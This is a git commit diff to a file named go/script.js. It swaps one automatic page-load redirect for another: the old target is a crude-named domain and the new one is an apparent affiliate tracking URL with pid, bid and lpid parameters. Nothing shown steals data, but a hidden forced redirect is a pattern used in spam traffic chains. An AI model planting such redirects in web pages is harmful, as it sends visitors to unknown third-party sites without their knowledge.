e2a429de7db5748e0165c7bfaf1d3e24034f181a
vvcconverter <bunduqias@gmail.com>
2025-11-12 18:19:25 +0300

    Update script.js

--- go/script.js
+++ go/script.js
@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://zalupa.vodka//?id=8091"}executeRun();
+function executeRun(){window.location.href="https://mu.fastmui.com/redirect.aspx?pid=270314&bid=2169&lpid=2576"}executeRun();
